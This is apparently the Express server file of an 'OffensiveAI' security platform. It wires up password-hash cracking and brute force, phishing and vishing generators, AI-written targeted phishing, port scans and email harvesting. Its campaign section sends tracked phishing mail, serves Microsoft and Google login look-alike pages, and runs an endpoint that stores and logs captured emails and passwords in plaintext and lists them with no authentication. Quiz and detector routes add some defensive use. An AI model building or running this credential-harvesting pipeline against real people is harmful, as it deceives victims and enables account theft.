import express from 'express';
import cors from 'cors';
import Database from 'better-sqlite3';
import path from 'path';
import crypto from 'crypto';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { v4 as uuidv4 } from 'uuid';

import { analyzePassword, identifyHashType, attemptHashCrack, scorePassword, realCrackPassword, bruteForceGenerator, jtrCrackHash } from './engines/passwordEngine.js';
import { generatePhishingEmail, getPhishingTemplates, generateVishingScenario, getVishingScripts, analyzeCommunication, runInteractivePhishingSim, generateTargetedPhishing } from './engines/socialEngine.js';
import { AdaptiveEngine } from './engines/adaptiveEngine.js';
import { RiskEngine } from './engines/riskEngine.js';
import { CampaignEngine } from './engines/campaignEngine.js';
import { whoisLookup, dnsRecon, enumerateSubdomains, portScan, analyzeHeaders, harvestEmails } from './engines/osintEngine.js';
import { aiCrackPassword, aiScorePassword, getModelInfo as getMarkovInfo } from './engines/aiPasswordCracker.js';
import { detectPhishing, getPhishingModelInfo } from './engines/aiPhishingDetector.js';
import { predictStrength, getNNModelInfo } from './engines/aiStrengthPredictor.js';
import { smartAttack, generateSmartGuesses } from './engines/aiSmartGuess.js';
import { setApiKey, getStatus, securityAdvisor, generatePhishingEmail as geminiPhishing, analyzePasswordAI, threatAnalysis, securityChat, geminiCrack } from './engines/geminiEngine.js';
import { getMicrosoftPhishPage, getGooglePhishPage } from './data/phishingPages.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Database
const db = new Database(path.join(__dirname, 'offsec.db'));
db.pragma('journal_mode = WAL');

// Initialize engines
const adaptiveEngine = new AdaptiveEngine(db);
const riskEngine = new RiskEngine(db);
const campaignEngine = new CampaignEngine(db);

// Session management
app.post('/api/session', (req, res) => {
    const sessionId = uuidv4();
    res.json({ sessionId });
});

// ═══════════════════════════════════
// PASSWORD ANALYSIS ROUTES
// ═══════════════════════════════════

app.post('/api/password/analyze', (req, res) => {
    try {
        const { password, sessionId } = req.body;
        if (!password) return res.status(400).json({ error: 'Password is required' });
        const analysis = analyzePassword(password);
        if (sessionId) adaptiveEngine.recordPasswordAnalysis(sessionId, analysis);
        res.json(analysis);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/password/hash', (req, res) => {
    try {
        const { hash } = req.body;
        if (!hash) return res.status(400).json({ error: 'Hash is required' });
        const hashInfo = identifyHashType(hash);
        const crackResult = attemptHashCrack(hash);
        res.json({ hashInfo, crackResult });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/password/crack', (req, res) => {
    try {
        const { password, algorithm, sessionId } = req.body;
        if (!password) return res.status(400).json({ error: 'Password is required' });
        const result = realCrackPassword(password, algorithm || 'md5');
        if (sessionId) {
            const analysis = analyzePassword(password);
            adaptiveEngine.recordPasswordAnalysis(sessionId, analysis);
        }
        res.json(result);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// SSE live brute-force
app.get('/api/password/bruteforce', (req, res) => {
    const { hash, algorithm, maxLen } = req.query;
    if (!hash) { res.status(400).json({ error: 'hash query param required' }); return; }
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();

    const generator = bruteForceGenerator(hash, algorithm || 'md5', parseInt(maxLen) || 4);
    const interval = setInterval(() => {
        const next = generator.next();
        if (next.done) { res.write(`data: ${JSON.stringify({ type: 'complete' })}\n\n`); clearInterval(interval); res.end(); return; }
        res.write(`data: ${JSON.stringify(next.value)}\n\n`);
        if (next.value.type === 'cracked' || next.value.type === 'exhausted') { clearInterval(interval); res.end(); }
    }, 1);
    req.on('close', () => clearInterval(interval));
});

app.post('/api/password/batch', (req, res) => {
    try {
        const { passwords, sessionId } = req.body;
        if (!passwords || !Array.isArray(passwords)) return res.status(400).json({ error: 'Passwords array is required' });
        const results = passwords.slice(0, 50).map(p => {
            const analysis = analyzePassword(p);
            if (sessionId) adaptiveEngine.recordPasswordAnalysis(sessionId, analysis);
            return analysis;
        });
        const summary = {
            total: results.length,
            averageScore: Math.round(results.reduce((s, r) => s + r.score, 0) / results.length),
            weakCount: results.filter(r => r.score < 40).length, strongCount: results.filter(r => r.score >= 70).length,
            dictionaryMatches: results.filter(r => r.dictionary.found).length,
        };
        res.json({ results, summary });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/password/generate-hash', (req, res) => {
    try {
        const { password, algorithm } = req.body;
        if (!password) return res.status(400).json({ error: 'Password is required' });
        const algo = algorithm || 'md5';
        const hash = crypto.createHash(algo).update(password).digest('hex');
        res.json({ password, algorithm: algo, hash });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// JtR-style hash cracker
app.post('/api/password/jtr-crack', (req, res) => {
    try {
        const { hash, algorithm, wordlist, sessionId } = req.body;
        if (!hash) return res.status(400).json({ error: 'Hash is required' });
        const words = wordlist && Array.isArray(wordlist) ? wordlist : [];
        const result = jtrCrackHash(hash, algorithm, words);
        res.json(result);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ═══════════════════════════════════
// SOCIAL ENGINEERING ROUTES
// ═══════════════════════════════════

app.get('/api/social/templates', (req, res) => { res.json(getPhishingTemplates()); });

app.post('/api/social/phishing', (req, res) => {
    try {
        const { templateId, customVars, sessionId } = req.body;
        if (!templateId) return res.status(400).json({ error: 'templateId is required' });
        const email = generatePhishingEmail(templateId, customVars);
        if (sessionId) adaptiveEngine.recordPhishingSim(sessionId, templateId, email.category, email.difficulty, false);
        res.json(email);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/social/targeted-phishing', (req, res) => {
    try {
        const { targetInfo, sessionId } = req.body;
        if (!targetInfo) return res.status(400).json({ error: 'targetInfo is required' });
        const result = generateTargetedPhishing(targetInfo);
        if (sessionId) adaptiveEngine.recordPhishingSim(sessionId, 'targeted', 'Targeted Attack', 'Expert', false);
        res.json(result);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/social/analyze', (req, res) => {
    try {
        const { text, sessionId } = req.body;
        if (!text) return res.status(400).json({ error: 'Text is required' });
        const analysis = analyzeCommunication(text);
        analysis.textLength = text.length;
        if (sessionId) adaptiveEngine.recordSocialAnalysis(sessionId, analysis);
        res.json(analysis);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/social/vishing', (req, res) => { res.json(getVishingScripts()); });
app.post('/api/social/vishing', (req, res) => {
    try {
        const { scriptId, customVars } = req.body;
        if (!scriptId) return res.status(400).json({ error: 'scriptId is required' });
        res.json(generateVishingScenario(scriptId, customVars));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/social/phishing-test', (req, res) => {
    try { res.json(runInteractivePhishingSim()); }
    catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/social/phishing/detect', (req, res) => {
    try {
        const { sessionId, templateId, detected } = req.body;
        if (!sessionId || !templateId) return res.status(400).json({ error: 'sessionId and templateId required' });
        adaptiveEngine.recordPhishingSim(sessionId, templateId, '', '', detected);
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ═══════════════════════════════════
// CAMPAIGN ROUTES — Email Delivery & Tracking
// ═══════════════════════════════════

// SMTP config
app.post('/api/campaign/smtp-config', (req, res) => {
    try { res.json(campaignEngine.saveSMTPConfig(req.body)); }
    catch (err) { res.status(500).json({ error: err.message }); }
});
app.get('/api/campaign/smtp-config', (req, res) => {
    res.json(campaignEngine.getSMTPConfig() || { configured: false });
});
app.post('/api/campaign/smtp-test', async (req, res) => {
    try { res.json(await campaignEngine.testSMTP()); }
    catch (err) { res.status(500).json({ error: err.message }); }
});

// Campaign CRUD
app.post('/api/campaign/create', (req, res) => {
    try { res.json(campaignEngine.createCampaign(req.body)); }
    catch (err) { res.status(500).json({ error: err.message }); }
});
app.get('/api/campaign/list', (req, res) => {
    try { res.json(campaignEngine.listCampaigns()); }
    catch (err) { res.status(500).json({ error: err.message }); }
});
app.get('/api/campaign/:id', (req, res) => {
    try {
        const campaign = campaignEngine.getCampaign(req.params.id);
        if (!campaign) return res.status(404).json({ error: 'Campaign not found' });
        res.json(campaign);
    } catch (err) { res.status(500).json({ error: err.message }); }
});
app.get('/api/campaign/stats/:id', (req, res) => {
    try {
        const stats = campaignEngine.getCampaignStats(req.params.id);
        if (!stats) return res.status(404).json({ error: 'Campaign not found' });
        res.json(stats);
    } catch (err) { res.status(500).json({ error: err.message }); }
});
app.delete('/api/campaign/:id', (req, res) => {
    try { res.json(campaignEngine.deleteCampaign(req.params.id)); }
    catch (err) { res.status(500).json({ error: err.message }); }
});

// Targets
app.post('/api/campaign/:id/targets', (req, res) => {
    try {
        const { targets } = req.body;
        if (!targets || !Array.isArray(targets)) return res.status(400).json({ error: 'targets array required' });
        res.json(campaignEngine.addTargets(req.params.id, targets));
    } catch (err) { res.status(500).json({ error: err.message }); }
});
app.delete('/api/campaign/target/:id', (req, res) => {
    try { res.json(campaignEngine.removeTarget(req.params.id)); }
    catch (err) { res.status(500).json({ error: err.message }); }
});

// Launch campaign
app.post('/api/campaign/:id/launch', async (req, res) => {
    try {
        const serverBaseUrl = `${req.protocol}://${req.get('host')}`;
        res.json(await campaignEngine.launchCampaign(req.params.id, serverBaseUrl));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── Tracking & Collection Endpoints (public-facing) ──────

// Tracking pixel (email opened)
app.get('/track/:trackingId/open', (req, res) => {
    campaignEngine.recordOpen(req.params.trackingId, req.ip, req.get('user-agent'));
    // Return 1x1 transparent GIF
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.set({ 'Content-Type': 'image/gif', 'Cache-Control': 'no-store, no-cache', 'Content-Length': pixel.length });
    res.end(pixel);
});

// ─── Phishing landing pages (must be before :trackingId catch-all) ───
app.get('/phish/microsoft', (req, res) => {
    const trackingId = req.query.tid || '';
    // Record click in campaign engine if tracking ID provided
    if (trackingId) {
        campaignEngine.recordClick(trackingId, req.ip, req.get('user-agent'));
    }
    res.send(getMicrosoftPhishPage(trackingId));
});
app.get('/phish/google', (req, res) => {
    const trackingId = req.query.tid || '';
    if (trackingId) {
        campaignEngine.recordClick(trackingId, req.ip, req.get('user-agent'));
    }
    res.send(getGooglePhishPage(trackingId));
});

// Phishing landing page (clicked link) — campaign default page
app.get('/phish/:trackingId', (req, res) => {
    const target = campaignEngine.getTargetByTracking(req.params.trackingId);
    if (!target) return res.status(404).send('Page not found');
    campaignEngine.recordClick(req.params.trackingId, req.ip, req.get('user-agent'));
    // Use Microsoft phishing page instead of the default campaign page
    res.send(getMicrosoftPhishPage(req.params.trackingId));
});

// Data collection (form submitted on landing page)
app.post('/collect/:trackingId', (req, res) => {
    const result = campaignEngine.recordSubmission(req.params.trackingId, req.body, req.ip, req.get('user-agent'));
    res.json({ success: !!result });
});

// ═══════════════════════════════════
// OSINT RECON ROUTES
// ═══════════════════════════════════

app.post('/api/osint/whois', async (req, res) => {
    try {
        const { domain } = req.body;
        if (!domain) return res.status(400).json({ error: 'domain required' });
        res.json(await whoisLookup(domain));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/osint/dns', async (req, res) => {
    try {
        const { domain } = req.body;
        if (!domain) return res.status(400).json({ error: 'domain required' });
        res.json(await dnsRecon(domain));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/osint/subdomains', async (req, res) => {
    try {
        const { domain } = req.body;
        if (!domain) return res.status(400).json({ error: 'domain required' });
        res.json(await enumerateSubdomains(domain));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/osint/portscan', async (req, res) => {
    try {
        const { target, ports } = req.body;
        if (!target) return res.status(400).json({ error: 'target required' });
        res.json(await portScan(target, ports));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/osint/headers', async (req, res) => {
    try {
        const { url } = req.body;
        if (!url) return res.status(400).json({ error: 'url required' });
        res.json(await analyzeHeaders(url));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/osint/harvest-emails', (req, res) => {
    try {
        const { domain, names } = req.body;
        if (!domain) return res.status(400).json({ error: 'domain required' });
        res.json(harvestEmails(domain, names || []));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ═══════════════════════════════════
// ADAPTIVE LEARNING ROUTES
// ═══════════════════════════════════

app.get('/api/adaptive/profile/:sessionId', (req, res) => {
    try { res.json(adaptiveEngine.getBehaviorProfile(req.params.sessionId)); }
    catch (err) { res.status(500).json({ error: err.message }); }
});
app.get('/api/adaptive/stats', (req, res) => {
    try { res.json(adaptiveEngine.getDashboardStats()); }
    catch (err) { res.status(500).json({ error: err.message }); }
});

// ═══════════════════════════════════
// RISK ASSESSMENT ROUTES
// ═══════════════════════════════════

app.get('/api/risk/assessment/:sessionId', (req, res) => {
    try { res.json(riskEngine.generateRiskAssessment(req.params.sessionId)); }
    catch (err) { res.status(500).json({ error: err.message }); }
});

// ═══════════════════════════════════
// TRAINING ROUTES
// ═══════════════════════════════════

app.post('/api/training/record', (req, res) => {
    try {
        const { sessionId, module, score, totalQuestions, correctAnswers, weakAreas } = req.body;
        adaptiveEngine.recordTraining(sessionId, module, score, totalQuestions, correctAnswers, weakAreas || []);
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/training/questions', (req, res) => { res.json(getTrainingQuestions()); });

function getTrainingQuestions() {
    return [
        { id: 1, module: 'password_security', difficulty: 'Easy', question: 'Which of the following is the STRONGEST password?', options: ['Password123!', 'correct-horse-battery-staple', 'P@$$w0rd', 'Admin2026'], correct: 1, explanation: 'Passphrases provide more entropy than short complex passwords.' },
        { id: 2, module: 'phishing_detection', difficulty: 'Medium', question: 'What is the MOST reliable way to verify if an email is legitimate?', options: ['Check if it has a company logo', 'Hover over links to see the URL', 'Contact the sender through a known, separate channel', 'Check for spelling errors'], correct: 2, explanation: 'Contacting through a known, separate channel is the most reliable.' },
        { id: 3, module: 'social_engineering', difficulty: 'Medium', question: 'An attacker calls pretending to be from IT and asks for your password. What should you do?', options: ['Give them your password', 'Ask for their employee ID first', 'Hang up and call IT using the official number', 'Change your password then give the old one'], correct: 2, explanation: 'Never give passwords. Verify through official channels.' },
        { id: 4, module: 'phishing_detection', difficulty: 'Easy', question: 'Which is a RED FLAG in an email?', options: ['Sent during business hours', 'Has a company signature', 'Demands immediate action or account suspension', 'From a known colleague'], correct: 2, explanation: 'Urgency tactics prevent critical thinking.' },
        { id: 5, module: 'password_security', difficulty: 'Medium', question: 'What does "salting" a password hash do?', options: ['Makes the password shorter', 'Adds random data before hashing', 'Encrypts the password twice', 'Converts to uppercase'], correct: 1, explanation: 'Salt prevents rainbow table attacks.' },
        { id: 6, module: 'social_engineering', difficulty: 'Hard', question: 'Which technique exploits the human tendency to return favors?', options: ['Pretexting', 'Reciprocity', 'Tailgating', 'Shoulder surfing'], correct: 1, explanation: 'Reciprocity exploits obligation to return favors.' },
        { id: 7, module: 'phishing_detection', difficulty: 'Hard', question: 'A "homograph attack" involves:', options: ['Similar-looking characters from different alphabets in URLs', 'Sending emails at specific times', 'Adding extra mailto: links', 'Using shortened URLs'], correct: 0, explanation: 'Homograph attacks use visually identical characters.' },
        { id: 8, module: 'password_security', difficulty: 'Hard', question: 'Which hash algorithm should NEVER be used for password storage?', options: ['bcrypt', 'MD5', 'Argon2', 'scrypt'], correct: 1, explanation: 'MD5 is fast and has known vulnerabilities.' },
        { id: 9, module: 'social_engineering', difficulty: 'Easy', question: 'What is "tailgating" in security?', options: ["Following someone's car", 'Following an authorized person through a secure door', 'Monitoring online activity', 'Sending follow-up phishing emails'], correct: 1, explanation: 'Tailgating bypasses physical security controls.' },
        { id: 10, module: 'phishing_detection', difficulty: 'Medium', question: 'You receive an email from "microsoft-support.com". What\'s suspicious?', options: ['Microsoft never sends emails', "The domain is not Microsoft's official domain", 'Password reset emails are always safe', 'It mentions Microsoft 365'], correct: 1, explanation: 'Official domain is "microsoft.com".' },
    ];
}

// ═══════════════════════════════════
// AI ENGINE ROUTES
// ═══════════════════════════════════

// AI Markov Chain password cracker
app.post('/api/ai/crack-password', (req, res) => {
    try {
        const { hash, algorithm, wordlist } = req.body;
        if (!hash) return res.status(400).json({ error: 'Hash is required' });
        const words = wordlist && Array.isArray(wordlist) ? wordlist : [];
        const result = aiCrackPassword(hash, algorithm || 'md5', words);
        res.json(result);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// AI NLP Phishing detector
app.post('/api/ai/detect-phishing', (req, res) => {
    try {
        const { text } = req.body;
        if (!text) return res.status(400).json({ error: 'Text is required' });
        res.json(detectPhishing(text));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// AI Neural Network strength predictor
app.post('/api/ai/predict-strength', (req, res) => {
    try {
        const { password } = req.body;
        if (!password) return res.status(400).json({ error: 'Password is required' });
        res.json(predictStrength(password));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// AI model info
app.get('/api/ai/models', (req, res) => {
    res.json({
        markovChain: getMarkovInfo(),
        phishingDetector: getPhishingModelInfo(),
        neuralNetwork: getNNModelInfo(),
    });
});

// AI Smart Attack (with hash cracking)
app.post('/api/ai/smart-attack', (req, res) => {
    try {
        const { profile, hash, algorithm } = req.body;
        if (!profile) return res.status(400).json({ error: 'Profile is required' });
        if (hash) {
            res.json(smartAttack(profile, hash, algorithm || 'md5'));
        } else {
            res.json(generateSmartGuesses(profile));
        }
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ═══ GEMINI AI ROUTES ═══
app.post('/api/gemini/config', (req, res) => {
    try {
        const { apiKey } = req.body;
        if (!apiKey) return res.status(400).json({ error: 'API key is required' });
        res.json(setApiKey(apiKey));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/gemini/status', (req, res) => res.json(getStatus()));

// Gemini AI Password Cracker
app.post('/api/gemini/crack', async (req, res) => {
    try {
        const { profile, hash, algorithm } = req.body;
        if (!profile || !hash) return res.status(400).json({ error: 'Profile and hash are required' });
        res.json(await geminiCrack(profile, hash, algorithm || 'md5'));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/gemini/advisor', async (req, res) => {
    try {
        const { query, context } = req.body;
        if (!query) return res.status(400).json({ error: 'Query is required' });
        res.json(await securityAdvisor(query, context));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/gemini/phishing', async (req, res) => {
    try {
        const { target } = req.body;
        if (!target) return res.status(400).json({ error: 'Target profile is required' });
        res.json(await geminiPhishing(target));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/gemini/password-report', async (req, res) => {
    try {
        const { password, analysis } = req.body;
        if (!password) return res.status(400).json({ error: 'Password is required' });
        res.json(await analyzePasswordAI(password, analysis));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/gemini/chat', async (req, res) => {
    try {
        const { message, history } = req.body;
        if (!message) return res.status(400).json({ error: 'Message is required' });
        res.json(await securityChat(message, history));
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// Dataset info (for reviewer — shows all data sources)
app.get('/api/datasets', (req, res) => {
    try {
        import('./data/dataLoader.js').then(({ getDatasetInfo }) => {
            res.json(getDatasetInfo());
        });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── PHISHING CREDENTIAL CAPTURE ────────────────────────────────

// In-memory captured credentials store
const capturedCreds = [];

// Credential capture endpoint (called by phishing pages)
app.post('/api/phish/capture', (req, res) => {
    const { email, password, campaignId, timestamp, userAgent, source } = req.body;
    const entry = {
        id: capturedCreds.length + 1,
        email: email || 'unknown',
        password: password || '',
        campaignId: campaignId || 'manual',
        source: source || 'unknown',
        userAgent: userAgent || '',
        capturedAt: timestamp || new Date().toISOString(),
        ip: req.ip || req.connection?.remoteAddress || 'unknown',
    };
    capturedCreds.push(entry);
    console.log(`🎣 CREDENTIAL CAPTURED: ${entry.email} / ${entry.password} (source: ${entry.source})`);
    res.json({ success: true });
});

// View all captured credentials
app.get('/api/phish/captured', (req, res) => {
    res.json({ total: capturedCreds.length, credentials: capturedCreds });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'operational', timestamp: new Date().toISOString(), version: '4.0.0-AI' });
});

// ─── Serve React frontend in production ─────────────────────
const distPath = path.join(__dirname, '..', 'dist');
if (fs.existsSync(distPath)) {
    app.use(express.static(distPath));
    app.get('/{*splat}', (req, res) => {
        res.sendFile(path.join(distPath, 'index.html'));
    });
}

app.listen(PORT, () => {
    console.log(`\n🔥 OffensiveAI Server v4.0-AI running on http://localhost:${PORT}`);
    console.log(`🧠 AI Engines: Markov Chain + NLP Phishing Detector + Neural Network`);
    console.log(`📡 API endpoints ready — Campaign engine + OSINT + AI enabled`);
    console.log(`📬 Campaign tracking: /track/:id/open, /phish/:id, /collect/:id`);
    console.log(`🗄️  Database initialized\n`);
});
